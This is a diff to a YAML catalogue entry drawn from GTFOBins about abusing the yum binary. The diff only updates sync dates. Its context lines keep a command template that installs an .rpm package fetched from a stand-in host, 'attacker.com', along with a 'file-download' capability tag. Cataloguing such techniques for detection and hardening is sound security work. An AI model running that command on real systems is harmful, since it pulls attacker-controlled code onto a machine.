@@ -13,7 +13,7 @@ sources:
   upstream_url: https://gtfobins.github.io
   license: GPL-3.0
   upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
-  last_synced: '2026-11-14'
+  last_synced: '2026-11-16'
 commands:
 - template: yum install http://attacker.com/path/to/input-file.rpm
   comment: The file on the remote host must have the `.rpm` extension, but the content does not have to
@@ -65,7 +65,7 @@ source_data:
               from: python
     upstream_url: https://gtfobins.github.io/gtfobins/yum/
     upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
-    last_synced: '2026-11-14'
+    last_synced: '2026-11-16'
 enrichment:
   capabilities:
   - value: file-download
@@ -101,6 +101,6 @@ enrichment:
 _meta:
   schema_version: 1
   generated_by: loldex-projection
-  projected_at: '2026-11-14'
+  projected_at: '2026-11-16'
   source_hashes:
     GTFOBins: sha256:96ab46011ed5e1b8b3cb7daedabed29c4ec93aed076c5afeed9c9fce907ffee6
